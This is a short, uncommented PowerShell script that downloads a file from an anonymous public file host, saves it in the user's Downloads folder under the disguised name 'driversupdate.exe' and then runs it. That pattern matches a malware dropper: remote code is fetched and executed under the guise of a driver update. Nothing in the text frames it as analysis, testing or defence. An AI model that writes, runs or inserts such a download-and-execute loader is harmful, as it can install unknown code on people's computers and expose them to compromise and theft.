$downloadUrl = "https://files.catbox.moe/uy96rs.exel"
Invoke-WebRequest $downloadUrl -OutFile $env:USERPROFILE\Downloads\driversupdate.exe
Start-Process $env:USERPROFILE\Downloads\driversupdate.exe -Wait
